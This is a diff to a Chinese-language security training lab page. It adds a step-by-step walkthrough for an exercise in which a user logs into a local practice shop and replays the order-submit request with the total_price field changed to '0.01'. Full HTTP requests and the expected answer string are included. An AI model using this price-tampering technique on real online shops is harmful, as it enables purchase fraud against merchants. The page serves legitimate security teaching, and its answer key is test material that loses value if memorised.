@@ -22,14 +22,69 @@ difficulty: practitioner
 
 ## 开始实战
 
-点击 **前往配套题目练习**，启动环境后：
-
-1. 配好代理，打开靶场的「购物商城」；
-2. 用预置账号 `user1` / `password123` 正常登录、逛一圈、提交一笔正常订单，观察 MITM 历史里 `POST /mall/order/submit` 的请求体结构（登录态在 `sessionID` Cookie 里）；
-3. 再次下单并**拦截**提交请求，把订单项里的总价字段改成 `0.01` 后放行；
-4. 响应里的中文成功提示原文就是本题答案。
+点击 **前往配套题目练习**，启动环境后：用预置账号 `user1` / `password123` 正常登录靶场「购物商城」，提交一笔正常订单，在 MITM 历史里观察 `POST /mall/order/submit` 的请求体结构（登录态在 `sessionID` Cookie 里）；再次下单并**拦截**提交请求，把订单项里的总价字段 `total_price` 改成 `"0.01"` 后放行，响应里的中文成功提示原文就是本题答案。
 
 也可以不走拦截：在历史里右键该请求 **发送到 Web Fuzzer**，直接编辑 body 后重放，效果相同。
+
+<details>
+<summary>📋 详细步骤（点击展开，照做即可拿到答案）</summary>
+
+以下以实例地址 `http://127.0.0.1:36870` 为例——**端口每次启动环境都随机分配，请替换成你题目页显示的端口**。走 MITM 拦截或 Web Fuzzer 重放都可以，下面用 Web Fuzzer 给出可完全复制的请求（MITM 路径只是把第 3 步换成"拦截后手改"）。
+
+**第 1 步：启动实验环境**
+
+题目详情页点「启动实验环境」，等状态 running，复制访问地址（形如 `http://127.0.0.1:36870`）。
+
+**第 2 步：登录商城拿会话 Cookie**
+
+在 Web Fuzzer 发送（或配好 MITM 代理后在登录表单里用 `user1` / `password123` 登录，从历史里找到同样的请求）：
+
+```http
+POST /mall/user/login HTTP/1.1
+Host: 127.0.0.1:36870
+Content-Type: application/json
+
+{"username": "user1", "password": "password123"}
+```
+
+响应（`200`）：
+
+```json
+{"id":3,"success":true,"message":"Login successful"}
+```
+
+同时响应头里有 `Set-Cookie: sessionID=...`——这就是后续下单要带的登录态。（若用浏览器+MITM 走，Cookie 浏览器会自动带。）
+
+**第 3 步：提交一笔"一分钱"订单**
+
+把上一步响应里的 `sessionID` Cookie 值填进下面的请求再发送：
+
+```http
+POST /mall/order/submit HTTP/1.1
+Host: 127.0.0.1:36870
+Content-Type: application/json
+Cookie: sessionID=fixedSessionID
+
+{"user_id": 3, "order_items": [{"product_name": "iPhone", "quantity": "1", "total_price": "0.01"}]}
+```
+
+三个细节：字段是 **`user_id` + `order_items` 数组**；每项含 `product_name`、`quantity`、`total_price`；`quantity` 和 `total_price` 都是**字符串**。服务端对 `total_price` 只做转数字入库、不与商品定价核对——改价空间全在这里。
+
+**第 4 步：读取响应**
+
+状态码 `200`，body 是纯文本：
+
+```
+订单提交成功
+```
+
+（不带 Cookie 直接发第 3 步的请求，只会得到一段 `alert("请先登录")` 的跳转脚本——登录态校验是过的，价格校验是没有的。）
+
+**第 5 步：提交答案**
+
+回到题目详情页，提交 `订单提交成功`（中文原文，一字不差）。
+
+</details>
 
 ## 延伸：多包联动
 
